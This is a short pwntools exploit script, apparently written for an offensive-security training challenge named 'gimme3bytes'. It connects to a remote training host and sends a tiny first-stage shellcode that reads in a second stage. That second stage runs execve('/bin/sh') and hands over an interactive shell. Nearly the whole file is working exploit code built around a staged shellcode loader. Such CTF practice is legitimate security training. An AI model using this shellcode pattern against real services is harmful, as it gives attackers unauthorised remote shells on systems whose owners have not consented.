#! /usr/bin/python3
import sys
import pwn
import time
#pwn.context.log_level='DEBUG'

# per runnare il processo in virtual machine e interagirci da fuori:
# ssh= ssh("username","ip")
# r= ssh.process("./multistage")                    multistage name of the process

pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./gimme3bytes")
#pwn.gdb.attach(r, '''
#b * 0x004011e8
#c
#''' )

shellcode1= '''
pop rdx
syscall
'''
shellcode2='''
nop
nop
nop
nop
mov rdi,rsi
add rdi,0x24
mov rax,0x3b
mov rdx,0x0
mov rsi,0
syscall
'''
pwn.context.arch="amd64"
print(len(pwn.asm(shellcode1)))

#input("waiting")
#print(len(pwn.asm(shellcode1)))
#print(pwn.asm(shellcode1))
#print(20+len(pwn.asm(shellcode2)))

r = pwn.remote("bin.training.offdef.it",2004)
#r.interactive()
r.send(pwn.asm(shellcode1))
input("wait")
r.send(pwn.asm(shellcode2)+b'/////////////////////////bin/sh\x00')
#r.recv()
#r.send()
#r.send(len(fragment1)*b'\x90'+pwn.asm(shellcode2)+payload)
r.interactive()

#sys.stdout.buffer.write(pwn.asm(shellcode1)+(20-len(pwn.asm(shellcode1)))*b'\x41'+payload+pwn.asm(shellcode2))
#input("wait")
#sys.stdout.buffer.write(payload+pwn.asm(shellcode2))
